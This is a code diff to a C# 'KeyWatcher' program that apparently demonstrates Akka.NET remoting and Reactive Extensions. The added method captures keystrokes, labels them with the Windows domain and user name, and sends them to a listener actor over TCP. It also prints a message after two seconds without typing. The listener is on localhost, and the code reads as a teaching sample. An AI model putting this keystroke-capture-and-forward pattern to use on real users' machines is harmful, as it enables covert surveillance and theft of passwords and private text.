@@ -7,6 +7,7 @@ using KeyWatcher.Actors;
 using KeyWatcher.Dependencies;
 using KeyWatcher.Messages;
 using System;
+using System.Reactive.Linq;
 using System.Windows.Forms;
 
 namespace KeyWatcher.Host
@@ -20,7 +21,8 @@ namespace KeyWatcher.Host
 			//Program.UseSimpleKeyWatcher();
 			//Program.UseBufferedKeyWatcher();
 			//Program.UseAkkaLocally();
-			Program.UseAkkaWithRemoting();
+			//Program.UseAkkaWithRemoting();
+			Program.UseAkkaWithRemotingWithQuietness();
 		}
 
 		private static void UseBufferedKeyWatcher()
@@ -77,7 +79,7 @@ akka {
     }
     remote {
         helios.tcp {
-            port = 8090
+            port = 0
             hostname = localhost
         }
     }
@@ -89,7 +91,7 @@ akka {
 			using (var system = ActorSystem.Create("KeyWatcherHost", config))
 			{
 				var user = system
-					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:8080/user/user");
+					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/user/user");
 
 				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
 				{
@@ -99,6 +101,50 @@ akka {
 					};
 
 					Application.Run();
+				}
+			}
+		}
+
+		private static void UseAkkaWithRemotingWithQuietness()
+		{
+			var config = ConfigurationFactory.ParseString(@"
+akka {
+    actor {
+        provider = ""Akka.Remote.RemoteActorRefProvider, Akka.Remote""
+    }
+    remote {
+        helios.tcp {
+            port = 0
+            hostname = localhost
+        }
+    }
+}
+");
+
+			var userName = $"{(!string.IsNullOrWhiteSpace(Environment.UserDomainName) ? Environment.UserDomainName : ".")}\\{Environment.UserName}";
+
+			using (var system = ActorSystem.Create("KeyWatcherHost", config))
+			{
+				var user = system
+					.ActorSelection("akka.tcp://KeyWatcherListener@localhost:4545/user/user");
+
+				using (var keyLogger = new BufferedKeyWatcher(Program.BufferSize))
+				{
+					keyLogger.KeysLogged += (s, e) =>
+					{
+						user.Tell(new UserKeysMessage(userName, e.Keys));
+					};
+
+					var quietObservation =
+						Observable.FromEventPattern<BufferedKeysEventArgs>(
+							keyLogger, nameof(BufferedKeyWatcher.KeysLogged));
+
+					using (var quietSubscription = quietObservation
+						.Throttle(TimeSpan.FromSeconds(2))
+						.Subscribe(args => Console.Out.WriteLine("It's quiet in here...")))
+					{
+						Application.Run();
+					}
 				}
 			}
 		}
